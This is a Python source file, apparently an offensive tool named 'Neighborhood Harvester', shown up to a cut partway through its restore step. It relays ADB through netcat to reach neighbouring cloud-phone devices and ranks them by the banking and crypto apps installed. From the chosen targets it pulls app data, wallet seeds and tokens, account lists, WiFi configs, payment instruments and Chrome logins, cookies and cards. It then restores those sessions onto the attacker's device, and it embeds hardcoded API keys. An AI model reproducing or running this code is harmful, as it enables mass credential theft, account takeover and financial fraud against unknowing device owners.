#!/usr/bin/env python3
"""
Neighborhood Harvester v2.0
===========================
One-shot tool: scan ALL 192 neighbors → identify high-value fintech/crypto/wallet
→ interactive target selection → FULL app-level backup extraction (APK + /data/data
  + accounts + shared_prefs + databases + files + keystore) → restore to our device
  with sessions/logins/payments intact.

Architecture:
  Local → SSH tunnel → ADB forward → nc relay on D1 → Neighbor ADB (root)

Usage:
  python3 scanning/neighborhood_harvester.py scan          # Scan all 192 hosts
  python3 scanning/neighborhood_harvester.py pick          # Interactive target picker
  python3 scanning/neighborhood_harvester.py extract <IP>  # Full backup of target
  python3 scanning/neighborhood_harvester.py restore <IP>  # Restore backup to our device
  python3 scanning/neighborhood_harvester.py auto          # Scan → pick top → extract → restore
"""

import asyncio
import subprocess
import os
import sys
import json
import time
import shutil
import sqlite3
import tarfile
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
OUR_PAD = "AC32010810392"
OUR_IP = "10.0.21.62"
RELAY_PORT = 15573
ADB_BRIDGE = "localhost:8550"
HOSTS_FILE = "tmp/fullscan_hosts.txt"
SCAN_RESULTS = "tmp/harvest_scan.json"
BACKUP_ROOT = "tmp/harvested_backups"
RESTORE_LOG = "tmp/restore_log.json"

# High-value package database
HIGH_VALUE_PKGS = {
    # Wallets & Payment
    "com.google.android.apps.walletnfcrel": ("Google Wallet/Pay", 15),
    "com.paypal.android.p2pmobile": ("PayPal", 12),
    "com.venmo": ("Venmo", 12),
    "com.squareup.cash": ("Cash App", 12),
    "com.revolut.revolut": ("Revolut", 12),
    "com.samsung.android.spay": ("Samsung Pay", 10),
    "com.zellepay.zelle": ("Zelle", 10),
    "com.klarna.android": ("Klarna", 8),
    "com.afterpay.android": ("Afterpay", 8),
    # Crypto
    "io.metamask": ("MetaMask", 20),
    "com.wallet.crypto.trustapp": ("Trust Wallet", 20),
    "app.phantom": ("Phantom Wallet", 20),
    "com.coinbase.android": ("Coinbase", 15),
    "com.binance.dev": ("Binance", 15),
    "com.robinhood.android": ("Robinhood", 12),
    "com.bitpay.wallet": ("BitPay", 12),
    "com.wemade.wemixplay": ("WEMIX Play", 10),
    "com.wemade.ymirglobal": ("WEMIX Ymir", 10),
    "com.krakenfx.app": ("Kraken", 12),
    "piuk.blockchain.android": ("Blockchain.com", 12),
    "com.crypto.exchange": ("Crypto.com", 12),
    # Banking
    "com.chase.sig.android": ("Chase", 12),
    "com.wf.wellsfargo": ("Wells Fargo", 12),
    "com.bankofamerica.cashpro": ("Bank of America", 12),
    "com.usaa.mobile.android.usaa": ("USAA", 10),
    "com.capitalone.mobile": ("Capital One", 10),
    "com.citi.mobilebank": ("Citi", 10),
    "com.sofi.mobile": ("SoFi", 10),
    "com.chime.android": ("Chime", 10),
    "co.mona.android": ("Monzo", 10),
    "com.starlingbank.android": ("Starling", 10),
    "com.nubank.nubank": ("Nubank", 10),
    "com.n26.app": ("N26", 10),
    "com.transferwise.android": ("Wise", 10),
    "my.maya.android": ("Maya PH", 10),
    "com.globe.gcash.android": ("GCash PH", 10),
    "ua.monvel.bankalliance": ("Monvel UA", 10),
    "ua.com.abank": ("A-Bank UA", 10),
    # Exchanges
    "com.ftx.app": ("FTX", 10),
    "com.upbit.app": ("Upbit", 10),
    "com.bybit.app": ("Bybit", 10),
    "com.okex.app": ("OKX", 10),
}

FINTECH_KW = [
    "pay", "wallet", "bank", "cash", "venmo", "revolut", "wise", "coinbase",
    "binance", "crypto", "gpay", "paypal", "zelle", "gcash", "maya", "monvel",
    "abank", "remit", "wemade", "wemix", "metamask", "trust", "phantom",
    "uniswap", "opensea", "blockchain", "bitcoin", "ethereum", "token", "defi",
    "lending", "credit", "loan", "bnpl", "finance", "money", "nfc",
    "samsung.pay", "sofi", "chime", "robinhood", "klarna", "affirm", "nubank",
    "rappi", "yape", "lending", "exchange", "trading", "bitpay", "kucoin",
    "bybit", "okx", "kraken",
]

SYSTEM_PREFIXES = [
    "com.android.", "com.google.android.", "android.", "com.cloud.",
    "com.owlproxy.", "com.vmos.",
]

# ═══════════════════════════════════════════════════════════════════════
# ADB HELPERS
# ═══════════════════════════════════════════════════════════════════════

def adb(addr: str, cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except (subprocess.TimeoutExpired, Exception):
        return ""


def adb_pull(addr: str, remote: str, local: str, timeout: int = 60) -> bool:
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "pull", remote, local],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False


def adb_push(addr: str, local: str, remote: str, timeout: int = 60) -> bool:
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "push", local, remote],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════
# RELAY MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════

async def deploy_relay(client: VMOSCloudClient, target_ip: str, port: int = RELAY_PORT) -> bool:
    """Deploy nc relay on our device to forward to target neighbor."""
    # Kill old
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c",
        timeout_sec=8)
    await asyncio.sleep(0.4)
    # mkfifo
    r = await client.sync_cmd(OUR_PAD,
        f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok",
        timeout_sec=8)
    d = r.get("data", [])
    if not d or "fifo_ok" not in str(d[0].get("errorMsg", "")):
        return False
    await asyncio.sleep(0.3)
    # Launch relay
    r = await client.sync_cmd(OUR_PAD,
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok',
        timeout_sec=8)
    d = r.get("data", [])
    return bool(d) and "relay_ok" in str(d[0].get("errorMsg", ""))


def connect_relay(port: int = RELAY_PORT) -> str:
    addr = f"localhost:{port}"
    subprocess.run(
        ["adb", "-s", ADB_BRIDGE, "forward", f"tcp:{port}", f"tcp:{port}"],
        capture_output=True, timeout=8
    )
    subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    return addr


def disconnect_relay(port: int = RELAY_PORT):
    addr = f"localhost:{port}"
    subprocess.run(["adb", "disconnect", addr], capture_output=True, timeout=5)


async def kill_relay(client: VMOSCloudClient, port: int = RELAY_PORT):
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; echo d", timeout_sec=5)


# ═══════════════════════════════════════════════════════════════════════
# SCORING
# ═══════════════════════════════════════════════════════════════════════

def score_pkgs(pkgs: list[str]) -> tuple[int, list[str], list[str]]:
    """Score device by fintech/crypto value. Returns (score, hv_list, fin_list)."""
    score = 0
    hv = []
    fin = []
    for pkg in pkgs:
        if pkg in HIGH_VALUE_PKGS:
            name, pts = HIGH_VALUE_PKGS[pkg]
            score += pts
            hv.append(pkg)
        elif any(kw in pkg.lower() for kw in FINTECH_KW):
            score += 3
            fin.append(pkg)
    return score, hv, fin


def is_third_party(pkg: str) -> bool:
    return not any(pkg.startswith(p) for p in SYSTEM_PREFIXES) and pkg != "android"


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: SCAN ALL NEIGHBORS
# ═══════════════════════════════════════════════════════════════════════

async def scan_all(client: VMOSCloudClient, hosts: list[str], resume_from: int = 0) -> list[dict]:
    """Scan all hosts for packages and score them. Saves progress incrementally."""
    results = []
    # Load existing progress
    if os.path.exists(SCAN_RESULTS) and resume_from == 0:
        with open(SCAN_RESULTS) as f:
            existing = json.load(f)
        scanned_ips = {r["ip"] for r in existing if r.get("status") == "scanned"}
        results = existing
        hosts = [h for h in hosts if h not in scanned_ips]
        print(f"  Resuming: {len(scanned_ips)} already scanned, {len(hosts)} remaining")

    total = len(hosts)
    t0 = time.time()

    for i, ip in enumerate(hosts):
        elapsed = time.time() - t0
        eta = (elapsed / (i + 1)) * (total - i - 1) if i > 0 else 0
        print(f"  [{i+1:3d}/{total}] {ip:18s} elapsed={elapsed:.0f}s eta={eta:.0f}s", end="", flush=True)

        info = {"ip": ip, "status": "pending"}
        try:
            if not await deploy_relay(client, ip):
                info["status"] = "relay_fail"
                print(f" → RELAY FAIL")
                results.append(info)
                await asyncio.sleep(1)
                continue

            await asyncio.sleep(0.6)
            dev = connect_relay()
            await asyncio.sleep(0.3)

            test = adb(dev, "echo OK", 5)
            if "OK" not in test:
                info["status"] = "adb_fail"
                print(f" → ADB FAIL")
                disconnect_relay()
                await kill_relay(client)
                results.append(info)
                await asyncio.sleep(1)
                continue

            # Device identity
            info["brand"] = adb(dev, "getprop ro.product.brand", 4)
            info["model"] = adb(dev, "getprop ro.product.model", 4)
            info["android"] = adb(dev, "getprop ro.build.version.release", 4)
            info["serial"] = adb(dev, "getprop ro.serialno", 4)

            # Shell access level
            shell_id = adb(dev, "id", 4)
            info["shell"] = "root" if "uid=0" in shell_id else "shell"

            # All packages
            raw = adb(dev, "pm list packages", 12)
            pkgs = [l.replace("package:", "").strip() for l in raw.split("\n") if "package:" in l]
            info["pkg_count"] = len(pkgs)
            info["third_party"] = [p for p in pkgs if is_third_party(p)]

            # Score
            score, hv, fin = score_pkgs(pkgs)
            info["score"] = score
            info["high_value"] = hv
            info["high_value_names"] = [HIGH_VALUE_PKGS[p][0] for p in hv]
            info["fintech"] = fin
            info["all_pkgs"] = pkgs

            # Accounts
            accts_raw = adb(dev, "dumpsys account 2>/dev/null | grep 'Account {' | head -15", 8)
            accounts = []
            for line in accts_raw.split("\n"):
                if "name=" in line:
                    try:
                        name = line.split("name=")[1].split(",")[0]
                        atype = line.split("type=")[1].rstrip("}").strip()
                        accounts.append({"name": name, "type": atype})
                    except (IndexError, ValueError):
                        pass
            info["accounts"] = accounts

            # TapAndPay quick check (GMS)
            tap = adb(dev,
                "sqlite3 /data/data/com.google.android.gms/databases/tapandpay.db "
                "'SELECT count(*) FROM payment_instruments;' 2>/dev/null", 8)
            info["payment_instruments_count"] = int(tap) if tap.strip().isdigit() else 0

            info["status"] = "scanned"

            marker = ""
            if hv:
                marker = f" ★★★ HIGH VALUE (score={score})"
            elif fin:
                marker = f" ★★ FINTECH (score={score})"

            print(f" → {info['brand']} {info['model']:15s} | "
                  f"pkgs={info['pkg_count']} hv={len(hv)} fin={len(fin)} "
                  f"accts={len(accounts)} cards={info['payment_instruments_count']}"
                  f"{marker}")

            disconnect_relay()
            await kill_relay(client)

        except Exception as e:
            info["status"] = "error"
            info["error"] = str(e)
            print(f" → ERROR: {e}")

        results.append(info)

        # Save progress every 5 hosts
        if (i + 1) % 5 == 0:
            os.makedirs("tmp", exist_ok=True)
            with open(SCAN_RESULTS, "w") as f:
                json.dump(results, f, indent=2, default=str)

        await asyncio.sleep(2)

    # Final save
    os.makedirs("tmp", exist_ok=True)
    with open(SCAN_RESULTS, "w") as f:
        json.dump(results, f, indent=2, default=str)

    return results


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: INTERACTIVE TARGET PICKER
# ═══════════════════════════════════════════════════════════════════════

def pick_targets(results: list[dict]) -> list[dict]:
    """Present ranked targets and let developer choose."""
    scanned = [r for r in results if r.get("status") == "scanned"]
    scored = [r for r in scanned if r.get("score", 0) > 0]
    scored.sort(key=lambda x: x.get("score", 0), reverse=True)

    print(f"\n{'═'*80}")
    print(f"  NEIGHBORHOOD HARVEST — TARGET SELECTION")
    print(f"  Scanned: {len(scanned)} devices | With fintech/crypto: {len(scored)}")
    print(f"{'═'*80}")

    # Summary stats
    total_hv = sum(len(r.get("high_value", [])) for r in scored)
    total_accts = sum(len(r.get("accounts", [])) for r in scored)
    total_cards = sum(r.get("payment_instruments_count", 0) for r in scored)
    print(f"  Total high-value apps: {total_hv}")
    print(f"  Total accounts: {total_accts}")
    print(f"  Total payment instruments: {total_cards}")
    print()

    for i, r in enumerate(scored, 1):
        hv_str = ", ".join(r.get("high_value_names", []))
        fin_str = ", ".join(r.get("fintech", [])[:3])
        acct_str = ", ".join(a["name"] for a in r.get("accounts", [])[:3])
        cards = r.get("payment_instruments_count", 0)

        tier = "★★★" if r.get("high_value") else "★★ "
        shell_tag = "[ROOT]" if r.get("shell") == "root" else "[shell]"
        card_tag = f" 💳{cards}" if cards > 0 else ""

        print(f"  {i:3d}. {tier} {r['ip']:18s} | {r['brand']:10s} {r['model']:20s} "
              f"| score={r['score']:3d} {shell_tag}{card_tag}")
        if hv_str:
            print(f"       Apps: {hv_str}")
        if fin_str:
            print(f"       Fin:  {fin_str}")
        if acct_str:
            print(f"       Accts: {acct_str}")

    print(f"\n{'─'*80}")
    print(f"  Enter target numbers (comma-separated), 'all' for top 20, or 'q' to quit:")
    print(f"  Example: 1,3,5  or  1-10  or  all")

    try:
        choice = input("  > ").strip()
    except (EOFError, KeyboardInterrupt):
        choice = "all"

    if choice.lower() == "q":
        return []
    if choice.lower() == "all":
        return scored[:20]

    selected = []
    for part in choice.split(","):
        part = part.strip()
        if "-" in part:
            try:
                a, b = part.split("-")
                for n in range(int(a), int(b) + 1):
                    if 1 <= n <= len(scored):
                        selected.append(scored[n - 1])
            except ValueError:
                pass
        else:
            try:
                n = int(part)
                if 1 <= n <= len(scored):
                    selected.append(scored[n - 1])
            except ValueError:
                pass

    return selected


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: FULL APP-LEVEL BACKUP EXTRACTION
# ═══════════════════════════════════════════════════════════════════════

async def extract_full_backup(client: VMOSCloudClient, target: dict) -> dict:
    """
    Full extraction of a target device — pulls:
      1. APK files for all high-value + fintech apps
      2. Full /data/data/<pkg>/ (databases, shared_prefs, files, cache, etc.)
      3. Device accounts (AccountManager dump)
      4. GMS databases (tapandpay, etc.)
      5. Chrome data (logins, cookies, web data)
      6. System properties (full device identity)
      7. Keystore entries
    """
    ip = target["ip"]
    backup_dir = os.path.join(BACKUP_ROOT, ip.replace(".", "_"))
    os.makedirs(backup_dir, exist_ok=True)

    print(f"\n{'═'*70}")
    print(f"  FULL EXTRACTION: {ip} ({target.get('brand','')} {target.get('model','')})")
    print(f"  Shell: {target.get('shell','unknown')} | Score: {target.get('score',0)}")
    print(f"  Backup dir: {backup_dir}")
    print(f"{'═'*70}")

    if not await deploy_relay(client, ip):
        print(f"  [!] Relay deploy failed for {ip}")
        return {"ip": ip, "status": "relay_fail"}

    await asyncio.sleep(0.8)
    dev = connect_relay()
    await asyncio.sleep(0.4)

    test = adb(dev, "echo ALIVE", 5)
    if "ALIVE" not in test:
        print(f"  [!] ADB not responding on {ip}")
        disconnect_relay()
        await kill_relay(client)
        return {"ip": ip, "status": "adb_fail"}

    shell_id = adb(dev, "id", 5)
    is_root = "uid=0" in shell_id
    print(f"  Shell: {shell_id}")

    report = {
        "ip": ip,
        "brand": target.get("brand"),
        "model": target.get("model"),
        "android": target.get("android"),
        "shell": "root" if is_root else "shell",
        "extracted_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "apps": {},
    }

    # Determine which packages to extract
    pkgs_to_extract = list(target.get("high_value", []))
    pkgs_to_extract += [p for p in target.get("fintech", []) if p not in pkgs_to_extract]
    # Also always grab GMS and Chrome
    for extra in ["com.google.android.gms", "com.android.chrome"]:
        if extra not in pkgs_to_extract:
            pkgs_to_extract.append(extra)

    print(f"\n  Extracting {len(pkgs_to_extract)} packages...")

    for pkg_idx, pkg in enumerate(pkgs_to_extract, 1):
        pkg_label = HIGH_VALUE_PKGS.get(pkg, (pkg, 0))[0] if pkg in HIGH_VALUE_PKGS else pkg
        print(f"\n  [{pkg_idx}/{len(pkgs_to_extract)}] {pkg_label} ({pkg})")

        pkg_dir = os.path.join(backup_dir, pkg)
        os.makedirs(pkg_dir, exist_ok=True)
        pkg_report = {"package": pkg, "label": pkg_label, "files": []}

        # ── 3a. Extract APK ──
        apk_path = adb(dev, f"pm path {pkg} 2>/dev/null | head -1", 8)
        if apk_path and "package:" in apk_path:
            apk_remote = apk_path.replace("package:", "").strip()
            apk_local = os.path.join(pkg_dir, "base.apk")
            print(f"    APK: {apk_remote}")
            if adb_pull(dev, apk_remote, apk_local, 120):
                pkg_report["apk"] = apk_local
                pkg_report["files"].append("base.apk")
                sz = os.path.getsize(apk_local) if os.path.exists(apk_local) else 0
                print(f"    APK pulled: {sz/1024/1024:.1f} MB")
            else:
                print(f"    APK pull failed")

        # ── 3b. Check data access ──
        data_path = f"/data/data/{pkg}"
        dir_list = adb(dev, f"ls {data_path}/ 2>/dev/null || echo NO_ACCESS", 6)
        if "NO_ACCESS" in dir_list or not dir_list.strip():
            if not is_root:
                # Try run-as
                run_as = adb(dev, f"run-as {pkg} ls 2>&1 | head -3", 5)
                if "not debuggable" in run_as or "not found" in run_as:
                    print(f"    Data: NO ACCESS (not root, not debuggable)")
                    pkg_report["access"] = "denied"
                    report["apps"][pkg] = pkg_report
                    continue
                pkg_report["access"] = "run-as"
            else:
                pkg_report["access"] = "root-limited"
        else:
            pkg_report["access"] = "root"

        # ── 3c. Create tar of entire /data/data/<pkg> on device then pull ──
        tar_remote = f"/data/local/tmp/backup_{pkg.replace('.','_')}.tar.gz"
        tar_local = os.path.join(pkg_dir, f"data_data.tar.gz")

        # Use tar on device to pack everything
        print(f"    Creating tar of {data_path}...")
        tar_cmd = f"cd {data_path} && tar czf {tar_remote} . 2>/dev/null && echo TAR_OK && ls -la {tar_remote}"
        tar_result = adb(dev, tar_cmd, 60)

        if "TAR_OK" in tar_result:
            # Pull the tar
            if adb_pull(dev, tar_remote, tar_local, 120):
                sz = os.path.getsize(tar_local) if os.path.exists(tar_local) else 0
                print(f"    Data tar pulled: {sz/1024:.1f} KB")
                pkg_report["data_tar"] = tar_local
                pkg_report["files"].append("data_data.tar.gz")
            else:
                print(f"    Tar pull failed, falling back to individual files")
                await _pull_individual_files(dev, pkg, data_path, pkg_dir, pkg_report)
            # Cleanup remote tar
            adb(dev, f"rm -f {tar_remote}", 5)
        else:
            print(f"    Tar failed, pulling individual files")
            await _pull_individual_files(dev, pkg, data_path, pkg_dir, pkg_report)

        # ── 3d. Extract key preferences for quick inspection ──
        prefs_grep = adb(dev,
            f"grep -rhi 'email\\|user\\|balance\\|token\\|secret\\|key\\|seed\\|mnemonic\\|"
            f"private\\|passw\\|wallet\\|account\\|card\\|phone\\|session\\|bearer\\|"
            f"access_token\\|auth\\|refresh\\|cookie\\|csrf' {data_path}/shared_prefs/ "
            f"2>/dev/null | head -80", 15)
        if prefs_grep:
            pkg_report["prefs_hits"] = prefs_grep
            prefs_file = os.path.join(pkg_dir, "prefs_sensitive_hits.txt")
            with open(prefs_file, "w") as f:
                f.write(prefs_grep)

        # ── 3e. Quick DB inspection ──
        dbs_raw = adb(dev, f"ls {data_path}/databases/ 2>/dev/null", 5)
        if dbs_raw:
            pkg_report["databases"] = [d.strip() for d in dbs_raw.split("\n") if d.strip()]

        report["apps"][pkg] = pkg_report

    # ═══ DEVICE-LEVEL EXTRACTIONS ═══

    # ── 4. Accounts ──
    print(f"\n  ── Device Accounts ──")
    accts_full = adb(dev, "dumpsys account 2>/dev/null | head -200", 15)
    if accts_full:
        accts_file = os.path.join(backup_dir, "accounts_dump.txt")
        with open(accts_file, "w") as f:
            f.write(accts_full)
        report["accounts_file"] = accts_file
        # Parse
        accounts = []
        for line in accts_full.split("\n"):
            if "Account {" in line and "name=" in line:
                try:
                    name = line.split("name=")[1].split(",")[0]
                    atype = line.split("type=")[1].rstrip("}").strip()
                    accounts.append({"name": name, "type": atype})
                except (IndexError, ValueError):
                    pass
        report["accounts"] = accounts
        print(f"    Found {len(accounts)} accounts")
        for a in accounts[:10]:
            print(f"      {a['name']} ({a['type']})")

    # ── 5. Full system properties ──
    print(f"\n  ── System Properties ──")
    props = adb(dev, "getprop", 20)
    if props:
        props_file = os.path.join(backup_dir, "build.prop")
        with open(props_file, "w") as f:
            f.write(props)
        report["props_file"] = props_file
        print(f"    Saved {len(props.split(chr(10)))} properties")

    # ── 6. WiFi networks ──
    wifi = adb(dev, "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -100", 10)
    if wifi and "SSID" in wifi:
        wifi_file = os.path.join(backup_dir, "WifiConfigStore.xml")
        with open(wifi_file, "w") as f:
            f.write(wifi)
        report["wifi_file"] = wifi_file

    # ── 7. Installed packages list ──
    all_pkgs = adb(dev, "pm list packages -f", 15)
    if all_pkgs:
        pkgs_file = os.path.join(backup_dir, "packages_with_paths.txt")
        with open(pkgs_file, "w") as f:
            f.write(all_pkgs)

    # ── 8. GMS TapAndPay ──
    print(f"\n  ── GMS TapAndPay ──")
    tap_remote = "/data/data/com.google.android.gms/databases/tapandpay.db"
    tap_local = os.path.join(backup_dir, "tapandpay.db")
    if adb_pull(dev, tap_remote, tap_local, 30):
        print(f"    tapandpay.db pulled")
        # Quick query
        try:
            conn = sqlite3.connect(tap_local)
            cur = conn.cursor()
            cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [r[0] for r in cur.fetchall()]
            print(f"    Tables: {', '.join(tables)}")
            if "payment_instruments" in tables:
                cur.execute("SELECT * FROM payment_instruments")
                rows = cur.fetchall()
                print(f"    Payment instruments: {len(rows)}")
                cols = [d[0] for d in cur.description]
                for row in rows:
                    print(f"      {dict(zip(cols, row))}")
                report["payment_instruments"] = [dict(zip(cols, row)) for row in rows]
            conn.close()
        except Exception as e:
            print(f"    DB query error: {e}")

    # ── 9. Chrome Login Data + Web Data ──
    print(f"\n  ── Chrome Data ──")
    chrome_dir = os.path.join(backup_dir, "chrome")
    os.makedirs(chrome_dir, exist_ok=True)
    for db_name in ["Login Data", "Web Data", "Cookies"]:
        remote = f"/data/data/com.android.chrome/app_chrome/Default/{db_name}"
        local = os.path.join(chrome_dir, db_name.replace(" ", "_") + ".db")
        if adb_pull(dev, remote, local, 30):
            print(f"    {db_name}: pulled")
            try:
                conn = sqlite3.connect(local)
                cur = conn.cursor()
                if "Login" in db_name:
                    cur.execute("SELECT origin_url, username_value FROM logins LIMIT 20")
                    logins = cur.fetchall()
                    report["chrome_logins"] = [{"url": r[0], "user": r[1]} for r in logins]
                    print(f"    Saved logins: {len(logins)}")
                    for l in logins[:5]:
                        print(f"      {l[0]} → {l[1]}")
                elif "Web" in db_name:
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year FROM credit_cards")
                    cards = cur.fetchall()
                    report["chrome_cards"] = [
                        {"name": r[0], "exp": f"{r[1]}/{r[2]}"} for r in cards
                    ]
                    print(f"    Saved cards: {len(cards)}")
                conn.close()
            except Exception as e:
                print(f"    Chrome DB error: {e}")

    # ── 10. Save extraction report ──
    report["status"] = "extracted"
    report_file = os.path.join(backup_dir, "extraction_report.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)

    # Create tar archive of entire backup
    tar_path = f"{backup_dir}.tar.gz"
    print(f"\n  Creating archive: {tar_path}")
    with tarfile.open(tar_path, "w:gz") as tar:
        tar.add(backup_dir, arcname=os.path.basename(backup_dir))
    sz = os.path.getsize(tar_path) / 1024 / 1024
    print(f"  Archive: {sz:.1f} MB")

    disconnect_relay()
    await kill_relay(client)

    print(f"\n  ✓ Extraction complete for {ip}")
    return report


async def _pull_individual_files(dev: str, pkg: str, data_path: str,
                                  pkg_dir: str, pkg_report: dict):
    """Fallback: pull databases and shared_prefs individually."""
    # Databases
    dbs_raw = adb(dev, f"ls {data_path}/databases/ 2>/dev/null", 5)
    if dbs_raw:
        db_dir = os.path.join(pkg_dir, "databases")
        os.makedirs(db_dir, exist_ok=True)
        for db in dbs_raw.split("\n"):
            db = db.strip()
            if db and not db.endswith(("-wal", "-shm", "-journal")):
                local = os.path.join(db_dir, db)
                ok = adb_pull(dev, f"{data_path}/databases/{db}", local, 30)
                if ok:
                    pkg_report["files"].append(f"databases/{db}")

    # Shared prefs
    prefs_raw = adb(dev, f"ls {data_path}/shared_prefs/ 2>/dev/null", 5)
    if prefs_raw:
        prefs_dir = os.path.join(pkg_dir, "shared_prefs")
        os.makedirs(prefs_dir, exist_ok=True)
        for pf in prefs_raw.split("\n"):
            pf = pf.strip()
            if pf:
                local = os.path.join(prefs_dir, pf)
                ok = adb_pull(dev, f"{data_path}/shared_prefs/{pf}", local, 20)
                if ok:
                    pkg_report["files"].append(f"shared_prefs/{pf}")

    # Files directory listing
    files_raw = adb(dev, f"find {data_path}/files/ -type f 2>/dev/null | head -30", 10)
    if files_raw:
        files_dir = os.path.join(pkg_dir, "files")
        os.makedirs(files_dir, exist_ok=True)
        for fpath in files_raw.split("\n"):
            fpath = fpath.strip()
            if fpath:
                fname = os.path.basename(fpath)
                local = os.path.join(files_dir, fname)
                adb_pull(dev, fpath, local, 20)


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: RESTORE TO OUR DEVICE
# ═══════════════════════════════════════════════════════════════════════

async def restore_to_device(client: VMOSCloudClient, backup_ip: str):
    """
    Restore extracted backup to our device (OUR_PAD).
    For each app:
      1. Install APK if present
      2. Push /data/data/<pkg>/ (databases, shared_prefs, files)
      3. Fix permissions (chown/chmod)
      4. Force-stop and re-launch
    Also restores:
      - Device accounts (via account injection)
      - System properties (via updatePadProperties)
      - Chrome data
    """
    backup_dir = os.path.join(BACKUP_ROOT, backup_ip.replace(".", "_"))
    report_file = os.path.join(backup_dir, "extraction_report.json")

    if not os.path.exists(report_file):
        print(f"[!] No extraction report found at {report_file}")
        return

    with open(report_file) as f:
        report = json.load(f)

    print(f"\n{'═'*70}")
    print(f"  RESTORE TO DEVICE: {OUR_PAD}")
    print(f"  Source: {backup_ip} ({report.get('brand','')} {report.get('model','')})")
    print(f"{'═'*70}")

    # Connect to our device via ADB bridge
    our_dev = ADB_BRIDGE

    # Verify connection
    test = adb(our_dev, "echo READY", 5)
    if "READY" not in test:
        print("[!] Cannot connect to our device via ADB bridge")
        return

    our_id = adb(our_dev, "id", 5)
    our_root = "uid=0" in our_id
    print(f"  Our shell: {our_id}")

    if not our_root:
        print("  [!] Need root on our device for restore. Enabling...")
        await client.switch_root([OUR_PAD], enable=True, root_type=0)
        await asyncio.sleep(3)
        our_id = adb(our_dev, "id", 5)
        our_root = "uid=0" in our_id
        if not our_root:
            print("  [!] Root not available. Restore may be partial.")

    restore_log = {"source_ip": backup_ip, "target_pad": OUR_PAD, "apps": {}}

    for pkg, app_info in report.get("apps", {}).items():
        if app_info.get("access") == "denied":
            print(f"\n  SKIP {pkg} (was denied on source)")
            continue

        pkg_dir = os.path.join(backup_dir, pkg)
        if not os.path.exists(pkg_dir):
            continue

        print(f"\n  ── Restoring {app_info.get('label', pkg)} ({pkg}) ──")
        app_log = {"status": "pending"}

        # 1. Install APK
        apk_path = os.path.join(pkg_dir, "base.apk")
        if os.path.exists(apk_path):
            print(f"    Installing APK ({os.path.getsize(apk_path)/1024/1024:.1f} MB)...")
            # Push APK to device temp
            remote_apk = f"/data/local/tmp/{pkg}.apk"
            if adb_push(our_dev, apk_path, remote_apk, 120):
                install_result = adb(our_dev, f"pm install -r -g {remote_apk} 2>&1", 60)
                print(f"    Install: {install_result[:100]}")
                app_log["install"] = "Success" in install_result
                adb(our_dev, f"rm -f {remote_apk}", 5)
            else:
                # Try via VMOS Cloud API install
                print(f"    Push failed, trying API install...")
                app_log["install"] = False
        else:
            # Check if already installed
            check = adb(our_dev, f"pm path {pkg} 2>/dev/null", 5)
            if check:
                print(f"    Already installed")
                app_log["install"] = True
            else:
                print(f"    No APK in backup, not installed on target")
                app_log["install"] = False
                continue

        # 2. Force stop before data injection
        adb(our_dev, f"am force-stop {pkg}", 5)
        await asyncio.sleep(0.5)

        # 3. Push data
        data_tar = os.path.join(pkg_dir, "data_data.tar.gz")
        data_dir = f"/data/data/{pkg}"

        if os.path.exists(data_tar):
            print(f"    Pushing data tar...")
            remote_tar = f"/data/local/tmp/restore_{pkg.replace('.','_')}.tar.gz"
            if adb_push(our_dev, data_tar, remote_tar, 120):
                # Extract on device
                adb(our_dev, f"mkdir -p {data_dir}", 5)
                extract_result = adb(our_dev,
                    f"cd {data_dir} && tar xzf {remote_tar} 2>&1 && echo EXTRACT_OK", 30)
                print(f"    Extract: {'OK' if 'EXTRACT_OK' in extract_result else 'FAIL'}")
                app_log["data_restore"] = "EXTRACT_OK" in extract_result
                adb(our_dev, f"rm -f {remote_tar}", 5)
            else:
                print(f"    Tar push failed")
                app_log["data_restore"] = False
        else:
            # Push individual dirs
            for subdir in ["databases", "shared_prefs", "files"]:
                local_sub = os.path.join(pkg_dir, subdir)
                if os.path.exists(local_sub):
                    remote_sub = f"{data_dir}/{subdir}"
                    adb(our_dev, f"mkdir -p {remote_sub}", 5)
                    for fname in os.listdir(local_sub):
                        local_file = os.path.join(local_sub, fname)
                        if os.path.isfile(local_file):
                            adb_push(our_dev, local_file, f"{remote_sub}/{fname}", 30)
                    print(f"    Pushed {subdir}/")

        # 4. Fix permissions
        if our_root:
            # Get UID for this package
            uid_line = adb(our_dev, f"stat -c '%u' {data_dir} 2>/dev/null", 5)
            if uid_line and uid_line.isdigit():
                uid = uid_line
            else:
                # Try dumpsys
                uid_dump = adb(our_dev,
                    f"dumpsys package {pkg} 2>/dev/null | grep 'userId=' | head -1", 8)
                uid = ""
                if "userId=" in uid_dump:
                    try:
